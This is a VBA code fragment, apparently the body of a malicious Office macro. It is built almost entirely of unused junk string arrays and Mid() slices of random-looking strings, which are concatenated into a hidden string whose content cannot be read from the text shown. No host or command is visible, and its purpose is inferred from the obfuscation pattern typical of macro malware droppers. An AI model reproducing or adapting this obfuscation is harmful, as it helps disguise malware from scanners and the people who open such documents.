QcIZamPzMq = Array("DuPpZvwG", "BvMpnVOz", "wPNoUSAS", "ljPnwWuY", "LSAiZbaB")
bukSJwrdzWE = Array("qNKZwBSn", "UaGpJFtl", "twDpfIHi", "AodVUkXU", "oLzGIbTj")
pMKnSMB = "zIjwwRGCAC6O7MAKVZkMiPlGb7fDh"
dDsJQYS = Mid(pMKnSMB, 21, 4)
VWIPz = Array("RcTXQEOG", "ZPkcYlWh", "FfYKYwTk", "DlBzHmcR", "dTXCpjOv")
dhiWGUDvj = Array("ZXwEzuwC", "pPBdDJLU", "JiUfDQwm", "nTzENTsV", "RdkBAOlI")
WQwMiRFPB = Array("owIslzOT", "IDsGPjrI", "YKQfurpV", "XfMaYJUv", "zLqFIGAn")
ojhNQMh = "5zcHhRb8n5zTMHCDPM5AFEi0dQi%=tuCZilhGh&hap4wojYK0"
wqdGH = Mid(ojhNQMh, 27, 13)
IUjEnt = Array("EfwKalGi", "lbdqzFOz", "JmUGnovw", "jzIDsmAR", "JcbOvfvm")
hzhYaDIF = Array("Yiowjdzs", "zsvWmuAQ", "kzadcCpw", "bLhUizBi", "rihJzwRF")
NPzrHZ = Array("AQGArifO", "cLdwESJW", "oqVVwcOz", "rRiENrQm", "fVcMvoHz")
ENdzXLn = "iiwh48cUY66fMh7TuhP1h0uIwJjonul7Vq00IRHiJpOks%=s8"
jKzAszJb = Mid(ENdzXLn, 38, 10)
DoQHO = Array("fSsTVDZZ", "YKUJcwIX", "CIIZzbBk", "urSjpzaz", "jYpikvcn")
jDBYr = Array("sFfCXHJj", "MEKmjhzE", "RHYilqka", "jUZEGinH", "jVhuvwNn")
BVGbS = Array("hjWknoTB", "blMcWzCB", "VFTChFdi", "RDFKACIT", "tlwCTznv")
RCiDO = "FiQflaDSK59qsMwouUcf=szViFzXW3OYPstQIzU8z"
KCTrX = Mid(RCiDO, 21, 4)
HMKFRP = Array("AYdURKkj", "TfZqfKGc", "FoSkiJAY", "ctilBAhV", "RXCIbIQG")
dwDjzJb = Array("SWrVdSoj", "fTwfjCNq", "YErYbzhT", "zDYHIzAz", "XMSLSiuK")
QRrwoJww = Array("FzGhDBoP", "KLkXQsiS", "pXXZtjah", "TwIUkBYt", "KhSctzPv")
PwXZDOTlunY = "MY!%hHEMXpZ9FfVY7nuNP"
lbujzLPFzJh = Mid(PwXZDOTlunY, 3, 9)
ROaFndrO = Array("PJzwNdhi", "hzWuHVQY", "YYOFtTiI", "mqMiZCZp", "IcKkjiTp")
ScwRk = Array("Qinlfimo", "RuDUlKCv", "foJWQwEi", "ZjlfKfpu", "FYoPjscI")
imVOuUTzAja = Array("EXRfzFDw", "ZPFuUwYS", "ZIMwsGil", "FIOMVmOm", "LBSshYfT")
aVMzTQp = "knOqQJcbZRKIoua5n1Nsm0jkoVuYpc"
VhRcDuY = Mid(aVMzTQp, 14, 2)
zwJbjBnI = Array("cnFvauaI", "AWpXjdPz", "tjaqqrcm", "ASiTijlA", "dsWFBjKL")
GQrYLdu = Array("hGMzzrGi", "lUzAwodl", "LSuHLHiT", "kounHKwK", "VPIkicpJ")
ZNrlTb = Array("MAiKjkCo", "PktioDza", "csOIwSaa", "XoijfsGi", "cluKYUnA")
IdrdzTOo = "rtWZbGzfAWioz5APYI8SV25DnmN752anwkbO82SwU"
mrpJi = Mid(IdrdzTOo, 3, 5)
OtEITLcUkH = Array("mGYWRNWS", "PhImNhNu", "aImsFTIW", "iLGCIoBH", "FOVptDJJ")
TTRiwC = Array("SMTzkUUu", "YAkQhvuS", "zCsFHTKa", "jAjzLXAW", "wcZtAKlJ")
IuCVW = Array("qLiHElaK", "TDrrKDCw", "BsRknUjB", "ANRFVBSn", "RjOwpCWv")
UXDOfJHW = "PtXwcMlkYkCDjjUskzTU"
AvWWoooAn = Mid(UXDOfJHW, 5, 10)
sWEjYwGow = Array("aWfIfJLv", "aarHsBVW", "ccHqTVoS", "kEaboGJw", "WWKRpaVq")
oQbJHif = Array("CWiuJLuP", "NsUMvfbE", "hNYajkGU", "RskVrEjB", "GQowqtJY")
uOtOAPYAsAr = Array("JKOwlwDr", "uFjbCvHR", "PKdQaYYI", "LSGiqfOn", "DzRZWKiV")
OrRco = "j5et %hHEMXaPVutjrtRI6782pKnJLXmGCAtEqIUA7io7tw"
EuTojilh = Mid(OrRco, 3, 9)
KRqQlibdIN = Array("ptblUFzL", "JWhjQszk", "lFkTqYAP", "rwXCdivE", "cHahzmoG")
XIsijzU = Array("TuVUziWL", "BjnQaOfR", "tLuYhwhb", "acDJSQnz", "RdAvCjRI")
vSacjS = Array("ZMAzufdN", "bJnmrPZW", "MttViNsl", "snzwOjON", "tmzUvjjv")
cmVkpG = "8sctkizz6sGavAVjC0Nm88r9GP1f"
LCGHRowHvpf = Mid(cmVkpG, 13, 4)
wNfHFRNO = Array("wqhIcAIB", "EdjImwiM", "UPFHfhws", "uasFQFac", "NzWofkIs")
iajQJQs = Array("fzslAFaw", "HmzjiZQR", "rpNCHClw", "CHvpaqjj", "HMbioNrp")
sSJCFvahF = Array("zvzdFuzn", "hEwpWGkd", "MuitJlWR", "FQZRwidi", "zYCMFHtI")
dztTrjXJq = oDQvprT + csFXvElwPn + pIfmtf + jVULd + wqdGH + sXKfKiaTR + jKzAszJb + MMXwDavXn + mNDzIv + mrpJi + SkrVkAkMFMh + KCTrX + LCGHRowHvpf + VhRcDuY + rWPlMGR + hRlKHnoM + zjwOIjvh + mIUcibQla + AvWWoooAn + dDsJQYS + iSqnikwKzi + EuTojilh + zCHQt + KKwDuXX + pLDnOjRRAf + fAbdcAVri + motOCvQ + OjJIjiwsq + ucBIITqIaE + QRKbAwVzHKV + lbujzLPFzJh + FmKZwQnVhmm

pMPRcM = "minvrTGpNHtNpImLSTMmMOzORTJZDNiaFAWZYnKcTrPOBkFhEpBJdKd9nTssTEuS"
wKWkiRzpo = Mid(pMPRcM, 6, 48)
LuHvm = Array("CXDVdbwH", "KWbiupTp", "rzohswoj", "jKAdOQHn", "IoliDhSj")
iLZjBQ = Array("HAMNQVZG", "iAhOQrcF", "iUlSbTtu", "PoWFDllK", "fHarkbSN")
wFvzoiv = Array("kuuNisXQ", "LjzjvzFn", "HSzczUCw", "PXjIQlVG", "BXihZjLW")
qDIFJ = "0BWJrBvd50YS7CIb5SLGnVBJSaIHKAvRqzGnWbkFojRwDYDBntvfdzcXUzjVaGMqFTnpFNUJZFREEFGtWHTQFQntWjTYuOfhWbrjkOvaZlGYfXTPrmwSmvkofuSWtvPKakicNWJIMtrUKPOwPEhIQMuaqCEqvZjdWvwupqBUdqGtEQiQfbNVkv1KrjpzFMN7Djzs8s"
XFollhO = Mid(qDIFJ, 19, 159)
WmvzRvBhEPo = Array("QFtXlCOf", "CnkSdqOQ", "rwzKJOza", "LshXRXOa", "GbLtaiKN")
znVbzXI = Array("JEGdACdL", "JRpaiANC", "FTMsUqNi", "ZKLCiVqM", "nkBEIWZI")
PzUaWaAaw = Array("PWOAinsG", "NJoHSRsS", "rbDqrajn", "bcnzwIti", "tEdzbNwm")
ajXpPloXirh = "r3w9sWBQzLp8UwduJwiqaIMjcnKjjwm5C0LDTXHaihdN"
LdGAbJ = Mid(ajXpPloXirh, 15, 15)
KQqktLzt = Array("RFoVhjuW", "siNjTjQo", "paYFAuHE", "PFNOourd", "fRYlmLGs")
tYOmWDaZb = Array("iRFQvNPJ", "npIBorlX", "wkFbVjhz", "rjBBKiCi", "TfXjoqJC")
BIbMF = Array("qEazmppn", "fBnBFfXB", "jIYLMNzI", "mdhJUCiH", "aDlQFiKB")
hZXIT = "C39VNntlZ6XTB2bBaEOGQrpU"
EkNnIlnKX = Mid(hZXIT, 4, 1)
DlqZpZzZl = Array("uNVJrAYo", "IVAjSzpc", "FSMJIfTd", "SjbCuGwA", "wXRwrpRm")
TjzuLPG = Array("EtAwCCpc", "NILnWAtO", "tsqKZWuB", "ZzhujrlP", "AaEPfUbQ")
owTCh = Array("qwomuIiz", "dCFzwGMh", "wzZCUuvW", "WwnvwdjY", "RaTaiHHQ")
LWdbVC = "Di7X0DrwYdTlwzN0sUhGjKQTzFsplIaiQIjihIDloRarsTcZCBMlrNNwXFOtHvcrNnVJjBqLDwSSjZajdSnkwpmDunLcuKdtojiFwStBLAivvuMwihPpHsuXAROtpNRs5zvipX9O7q5iwnWz4C0"
YnhTVji = Mid(LWdbVC, 19, 109)
EORNcwTbd = Array("VkRilmQt", "NWQfvYvw", "CRPwViBz", "SjhXnlzq", "sIjkdRkk")
YEChYS = Array("fthZNDds", "fXYQsJvn", "iRLFEsGb", "XZnmsLTl", "hfSbAcmP")
uPrsrJw = Array("DpsPNiwj", "MtBLFffm", "mFBnQqzT", "EnjNqUmG", "fwBOAqOo")
aRnoNFToArV = "hh52CBV8ko5EzhMZoHWWWFGdqJSjPkwiEwhbKoTEkFpWGWCkZfafLFtpmYjsZUzGnYNwzkOznSlRPjXUG7VOZprQjTm4j"
VQEfqkzvbT = Mid(aRnoNFToArV, 13, 69)
wzrrC = Array("bEZwJHfC", "zfouawwN", "qZLazlss", "GujJdRmw", "rMMLQBJw")
MQiaISCm = Array("HhNLfrjj", "zoYbfopp", "MhrPbWYi", "ssDNlnwp", "PPSRXhNP")
jVEEaQXH = Array("OzLosLQD", "WXzjJuVl", "IfSmoSvK", "sjLPVYSi", "UcAbKkph")
spbpMqKJ = "EMpjSfuTUzNipwJKHEQAtVSBtQlfSlzsQcSWfOjhtdUkiGGsJBScBtuPtnnCtOBjzUNHr1LFo8iPs7w4fPfz5Xws4t21N"
JQHkLrwjNH = Mid(spbpMqKJ, 2, 66)
rmpjvQDqZG = Array("bzqOnNfU", "ujIsOaaw", "EBwJzAhw", "FUPjutbY", "pkKobjWi")
pbBOV = Array("DqVoPZPt", "CDWJojhb", "SsJTwzaA", "FkCiPlUX", "iRFJitif")
CJXGDA = Array("EViqWRkJ", "DjWjXDfE", "QVjfWldR", "jwfWaYwY", "JdOdUjdn")
jjzWliEk = "uBtj0Z3VzkjWFpoQjshbrHRTzborjknblaOCHNatUIJhqDhzsOMRJYRFMPMoUYLNwElialIWSnHizkdwupzF1Frns6JBumY"
nmXNqoQji = Mid(jjzWliEk, 9, 75)
RVXXIVU = Array("AsbjOkAa", "lBsJJDIS", "sMGYmNji", "nwatpCjj", "svfiKzDz")
NkmUTN = Array("wElZfmOG", "VvkIcFBm", "JwsQJHli", "RMROXiIv", "JHaicJwA")
YtpnJHjjXqT = Array("jUXtSbDn", "usUOEmpq", "TCHTVAiq", "npwVfSKz", "zshpjrQq")
ilAjos = "TU4PBXpmirOTfVnJJPScPFzfmhMnRBGXabORPliOJpMpWPdqpuWpiiidszkjzPrzwsvrkzuYjDSZsHIWDWwWfRprtkZSAwPtzOqdUmGpAwIiPIlkoNfdRUShDEwzacXhoZcdRiCRQIWjILbkzoEWiUPzLK7iB"
DFNwOHZpPh = Mid(ilAjos, 16, 131)
mtlrj = Array("IiUiKtqW", "SjPZBffi", "mjGcciIb", "iURMFAHb", "mRLrfDjt")
XBTMmMuu = Array("wbDvDkwS", "MwCCloNZ", "WtwpciRR", "cnnjUnDi", "AMdBfMXw")
zFUIfzJZT = Array("WwzHzEpz", "ElVmGqQT", "KlTPwOzZ", "vUCYKLuJ", "VwTdfKUX")
FzhSpik = "zj9fPMHobn2jdn2HSC0E5PHnwunjrDAoNmICXOmCbSKWwCzBdwmqTXOCPYsFjR1o1zJcB"
zUnKYOSlW = Mid(FzhSpik, 23, 38)
kvDtTq = Array("zpfiSRbJ", "vJrutHBI", "AZMdCQnt", "qLQIWnnz", "QvRGiPHd")
EQHvLadH = Array("ssdAUAQN", "wLcGwrVj", "ClsGATmI", "VrdzqvZl", "SilJnmYq")
lEprwq = Array("vCMLKhBZ", "akEzWAdZ", "GUicXTXB", "mqnPFLtP", "MBKzGbwn")
IWKFbjlk = "kURuqFFK9zG0m9658dR8VdnSlccwIaQoGOYbaqqjISKLONJwmZrcNAlzkOCwzjIDmdJtzFhUkErWSbEYTdKjinaGcZrLnthbKHZkDPBjrXrJJPjIKidVWYUwCDRYOWjrXPLLCUUEcdrLwRzMsiBJQLElmahAwcSVqAmtEVGqJZstjJBlGEfjUXaLLZZbmTGALWVwiDIXcLAqTLbvzz7dl7LVnwh0z"
uYawANXQr = Mid(IWKFbjlk, 22, 185)
EGQTc = Array("pDWFrbOR", "EMDSHwSb", "fLYTumUO", "rokUqfSi", "WrnUwSJK")
YzawVrMIRi = Array("bVLtHaHQ", "jjSvCitD", "jHNCrubY", "tZwQIwfN", "BNrYaaHR")
IXNHHY = Array("jTlHNXbr", "zjloEGSh", "tmAiiqIk", "DEtpnUcI", "AwWYIULW")
LShSz = "UP8CAUHWThpTPzLJhmAcTIpmMmiIkTUziMjOcUNLVwlSjGJozSmEOmibPvsCWBsANqkCScJhwtjmtaHi3"
siwzizw = Mid(LShSz, 9, 61)
zaUabjLS = Array("zETYNrJu", "uJfoaYnp", "KBDIdmEd", "HcnHkuZZ", "adlZXjWM")
wqLaGKawmE = Array("vwudpnic", "JjNGRCsK", "ApRlDBKA", "jFOwnNRb", "irNfraoT")
tVQNBHt = Array("tLzDjTIY", "laZiSlJt", "otujZmpv", "OmbapNSZ", "AzrrDGUQ")
sZjbnomTXA = "KZQ8SmZdRqSOddBflzjouXmJbFikinpAOiEHSp"
tfiiJHZUpKW = Mid(sZjbnomTXA, 10, 27)
NzHRohOL = Array("zqLMojJt", "iTqwfEuH", "VBptriiX", "HzhUtRpi", "ZdljbcHf")
ZbAvhlNT = Array("dirWXUtv", "DkVBRaZP", "HnFoCozQ", "dIYCSKft", "uKQIqMAm")
iYSpA = Array("FlRIvnRw", "EWbnXSco", "ibsOvrcs", "EcHHJQZv", "mSjQXrVp")
AicwHX = "DIjtarGPPHnInpoidkaYCCFihqEJGfktrKvvHhFaqzGEoqVSzQkzjjqWfAGaiuNXOjrhitWvfAiFvAuqVmMpukJHUYPHbirvjipHwnnDtoUjBlbiGN8hQjMwWSE"
ilAOIzmkvfv = Mid(AicwHX, 15, 99)
IiwJwP = Array("razwisVb", "hcZPTlqN", "IYDSjJon", "zjAFjMRr", "FDXVujKM")
WjUCFrjA = Array("HjahrJcB", "bVIznDJh", "lJwCrQsV", "LhJPOVTb", "OqLAjHwn")
GEXswjzlzW = Array("EzdNDSEB", "uqkliIVq", "oFWJAMnG", "CjkwsIzd", "MKzrmiRt")
jiBQNjvWZ = "CqGp9ibEdZwutwmBTZbifvfDpTrhKnFHCvIEIWkszUvCpZMEZQzB"
wdrHCNbkKLZ = Mid(jiBQNjvWZ, 8, 42)
npwLDR = Array("dIVYkitG", "VUMiknns", "MXLWhHJl", "sGYXKdDK", "ndfrqPVU")
WWkhYoNz = Array("nibXwSsZ", "XFfPSuLW", "wkfiJWvr", "QCrHIvBz", "BrjCfloZ")
jCCzbpk = Array("NzAFwors", "RItGjrKR", "ikHublQb", "DhNaLIqN", "vGQKWqsb")
duCdMvSTo = "KfrNNjmfsX4QL0ZXrI7"
KBIIZnz = Mid(duCdMvSTo, 5, 6)
quNjb = Array("KwpzCvOK", "hSUvitzc", "iYBQaQhI", "SjKdazus", "rfkdvRYI")
iqTTTWlzh = Array("TDtsouiB", "IobzocBt", "QjhWkkjh", "XbEwJUjR", "ztwXWoUX")
YFYMXLzW = Array("zIVmXzDO", "iqMOjCXj", "TLVMqjsn", "HKzufdWc", "MKYbPwKa")
mbiUZEbmGN = "CjbWUQdNzvUzmMlKEzDaCbiOq9QwbAhnzlADhlUwGijSCEGpmFFMOmwwfSimwlzXUbtYqAVskmudtiMkjaLVuUYLmEXOCizUlLzbLhzmkNccsVCBGzFXZbdzCilldGqCmZshjkZwbZljswTRBVIEccuJizYcwNJdXZqScVUVYHwAqwHGOTkHzlZJiiwiLwBOQHJSFApjAnjUfuTmM7q9ZmiVlDtX"
jAWiE = Mid(mbiUZEbmGN, 27, 182)
WAWLSJZ = Array("YpUSHShz", "WNDKTHjN", "QhfNzIjA", "TkBZdvTX", "BvoAPZjp")
MbOcKLROLNq = Array("cAYSZLIF", "dLLiQwaP", "GUzXQITa", "tjIYSjwq", "AqkzkQaH")
ruhIh = Array("bvwSkkGF", "UYuuaJYU", "jwYsCknz", "MUhaMafq", "trvULApI")
NdMKvBjV = "ta3oGHKFFdkOMstiYlPcXSZMuIOdEOzKlzBRzwYtUjuCDfKtPshwUGPWbBjvtjAqjZdNrbiZMVHrXWIPwUNLhApfjiqwPdAofEWiCzCoKHkzwYwEtTzYSpIfkzdMkkKjUTLTAiMARZBaQpjKjlEvjcVpP3M5UtlN"
JoDXcSNdKm = Mid(NdMKvBjV, 7, 146)
CRHJqSvNWkt = Array("aDDumDQr", "RQTlsiEq", "IzGQDfsu", "sEBiNEIf", "IPSzhsLI")
zVhDvXMV = Array("EqIwHtzL", "nELMuZFu", "KIBhChiN", "HndcPFIQ", "ozLNXwmw")
aGKQiUoldzJ = Array("GqvIsvlj", "KXoYrdGX", "LuoUQVvh", "vvYwOsXO", "WCbLlVVL")
smjroAmh = "5siRjuuvMYjjdcwazHsipLKYTFUNFKSYlqYEMJWLpAIuiwzVSWvvhkFuQAIjn8sNPBauwmZ4mY7XAYvumY"
EjOZcCuzcS = Mid(smjroAmh, 6, 54)
WKrLPKtkZJK = Array("CuSsRjYL", "rnBcISik", "vNNwXoUR", "zaCoBulq", "ZcRWDCQL")
ztFRjYRBI = Array("WNFarvFD", "UrPYHYoN", "ZAtqhkKw", "CKDjAMjt", "wBaKjuaE")
aBNCazICt = Array("UzUJiNiA", "nEwCJZim", "DIXjrZDH", "KWbGwiii", "apWiPARp")
cWPfAlnXXIv = "XkZzEU7z4jz97s6HaFblEmSiIBqaaVwaKFWUToCIirlqTCbTKiWDnEhiLLAvsQzmOGRhnPMlDSHMBcPFaWQswvmGYrIInGQOrwbMkufuVlAVwUdjvvUVzHnTTLJwGEzwBtVDADUjqVWNuRJDOZNsmvOkKIsZkjnRnETDzZjra9ZQp4XqSzVjz"
uHYrIJmucX = Mid(cWPfAlnXXIv, 17, 153)
SUOdRzFZPu = Array("bDswPdkX", "WnHbWtMv", "vMzImcBJ", "ZRcTDwWC", "qiFohHsj")
ZlTODi = Array("mEjLWDIj", "cbmDBJDz", "BiWzBQTa", "REkooXNo", "USVhsqnW")
zNFfXWdQsho = Array("JwrbJTBj", "fFmzkufW", "kItSSUrE", "NzjinVGL", "vAnEZrQw")
rzAEXkpEwUD = "iZILzYMmwAdAoz4YbDviajpCGIznDsNoljooDQtVHwvjOXqBkioMArlJzJcbz3"
DRXWZvWz = Mid(rzAEXkpEwUD, 20, 37)
qvdUmjSoo = Array("DEIjlOEZ", "mzzjwVDp", "EmOLjSsK", "waEjGbzs", "svOOLITz")
wIOuIVVuzqo = Array("tJvoXWPa", "zwzmdFOk", "LzkKKVSL", "CFrAGoiv", "TOSZWEnc")
NjBrokfDN = Array("LdmIbKOn", "hiDNYIoY", "rkmRiOTI", "UETOmoNG", "KHwjjJkr")
BZIpF = "3Han7ik79HlhQEwhXciXkNFiPUAImVNLmrhwIwGQZGjzkAKZvNMFLkOahZdTTbPQOTTYXzZbWNzdiItOKbNYJHzBcGQjSmwwqTjQhlCzokjzmkwZfPJsNqGGURwQhqJjQznLYchYYPkYXBPrKrDDdEkAMcwPpmzm7jA"
uTvuhIkhm = Mid(BZIpF, 13, 146)
wsDwkIw = Array("qESblQXK", "atimSVzw", "KdoXrzAt", "QwDQKIpi", "zubawsWD")
YcodnCR = Array("jJosFbop", "KBWFUNAr", "EZLpNGAR", "EAmXuXAR", "GlqiLHnp")
izLnfcw = Array("HNGIljNm", "ujVWjhqa", "IXoFoRvn", "BEwjWSjw", "lWhzArfU")
dLikVzpTwh = "nbAHE45oj1iajGQAiXmJtWRSXrXiCcraiofbllJtsLWVZESndPLPAszrkQbcqfiJnStvboPwNtQhAvtTZkEmRcZlonrUJhCNhMiGKWMpAOBHbSroXIDGbrsKsIMmO9MiMfBj"
UTpdQEz = Mid(dLikVzpTwh, 13, 110)
uKmKbj = Array("mAdKBdlZ", "uPZnThBq", "SSHhldPc", "DYkKzqaQ", "rTSnolmX")
KpLScMl = Array("TZoHssdE", "UrhhkwjJ", "lAGcsaZE", "pIwzONCh", "jjNLoIjL")
cdcnWTDZidh = Array("ujpIJsjt", "kJCniJit", "AkRkvipH", "pAABkXUc", "RvhMkQuw")
zOlcZ = "VpE7KvTC570wJO0ntQaSXWSMJJpsAmYwwwklSDYGFqwVRjHcmPtfYtpamYURwQVjPKlAzrirRtMhXzvZBNFkstXDHKztiGJpVRFGzHculBNfjICodvQiKknVnitorkJKjXMFrobukLwrfsWzILQmqbikijTPNnCAsCvJwwwoTVzzmwquLujjUsYd0WW3CjYuw0ic6rXCF"
TfEQEYZQD = Mid(zOlcZ, 20, 162)
MMHVOvzn = Array("cDOFKPCX", "FULEqwQQ", "riTJsiIM", "pZVjbSIj", "pVIrPkwa")
KWIRWzk = Array("zdvPMPmS", "iRUCzlEz", "uCPltTvn", "McOVqYAH", "ltLOjtAZ")
BjHbWOiG = Array("nDEJzGlE", "RLwNULji", "hHDjBQcG", "RNQEZpNB", "BpzqOmqF")
MLNhTT = "4iWvaMV8ihiEBsiCDdopLCtiLcwdKjLKPDjUuwMowpjrkvqSLZjStnlTTaj0"
Yjwzp = Mid(MLNhTT, 12, 44)
ZOCJdoLrESV = Array("rJEfbmma", "MhjbqQXW", "azsjqjib", "zvMfNqPv", "RzsrMzfi")
wzMIf = Array("bpssJlLk", "RbPRtGPK", "fchfaHMV", "SkKsYjJd", "SOIAnlSL")
dNAVvwDAfH = Array("jcNmbwCK", "iiMjPzET", "cXaYbTMl", "RlwfzOWt", "KVwwtatU")
nPRlAUPcNDG = "0MUz5HbQ5M35zGwM4kp68MHOWvruETqDZzBffMfEOGzGtniOuRTfzfODszWXIkIjbVccOKAzBhqoiVbCNcznAKEtiwniqHwiwQfXLFzkQViRpZUWVTKjkUjQRjuQWSGtlMpSpEqHcPXifmDIiQMWzPtikOGcLjNwOljdkBjRcCDUzBkifllGGkvVSLhbzOwtCZPuFaYckFMCPT7SvbXHQ"
fLTfklaw = Mid(nPRlAUPcNDG, 26, 176)
IimoL = Array("izJpTaNS", "KpXQLtkQ", "PbVqzXNT", "LSYtDFZC", "iGpbJWRq")
uboST = Array("XfVIrFhR", "kfiSEDUL", "mqdABTPE", "PVmFDJHt", "JiSTBEcG")
WjYwPGBMUqP = Array("lHJXXHza", "lioTsRpD", "QRtWTbNb", "YoIalBJh", "NXPtKrjH")
iVRbB = "sMz3sYIfjLvq9niXizqaGsTYdAuViKYlZwGrIzaNwMunlwoGEjEALzipcWRLDIzFQWSwRpqAdzZMPE5i8TcZTi"
TSQjqTRdKz = Mid(iVRbB, 22, 48)
RpjOIYtMNW = Array("XLUZUnBs", "oODkLGmJ", "uhziwXpk", "VHFUBwtY", "klwHHnGk")
mbRKqTGQNh = Array("nQlWzYVH", "lGwcszJA", "WjENihrs", "ViAaHiBG", "bOvilSmw")
HNCOtvPzl = Array("lwiuzQjm", "bwlXjsCG", "YsBTYvzG", "FrBdBaOD", "zHckwzvF")
wzNkLbBfp = "bHj1JPbUQYRDbkzBiMFpjazkqtzlDuQJUqYGmzVjbGCmEtbMBbNZkinoEihwHpRVHIjkMsPjqYOdYLjzSlkbhqZqDkBHRWZmojiwKqAJMijMPJPsjQSpWOD5oi7sQiaCXPiMU"
clTpSqq = Mid(wzNkLbBfp, 7, 106)
WYiPmBOkY = Array("zNwItdXj", "MpJsRSYp", "wboFPDkB", "khabPRHb", "zwWKwqNb")
znFibTZ = Array("URQMQVmi", "jmlWIqpu", "czYLDvTu", "hivUvNtH", "ONlzmYkO")
ZjSEojq = Array("vvscjlSH", "GcizSCYY", "zVihaRiV", "tdIvFsHE", "MJPHDrOw")
JzJzP = "6taSssRWUItbbHVMhzIwwcwNCLObTUdiwhtYDSGWjVinQUUoSGoArozNzwrVRtDzfOduOzIOqlRi1Pfzpzb7qi"
RJQRj = Mid(JzJzP, 8, 68)
YYfcJbcDwTo = Array("QoOTftpL", "oMzQtCod", "MWiDcXCN", "UimInQUG", "HiRmDPqz")
TqGNK = Array("nwGssqKK", "VlvhILTt", "lAwBHhYY", "stJLkCaz", "fiPfQJVi")
BFDpEYcaho = Array("TcmBVnzw", "OYACQpsG", "YhAzhwZT", "LwBZvncc", "fUhiuXDE")
End Function
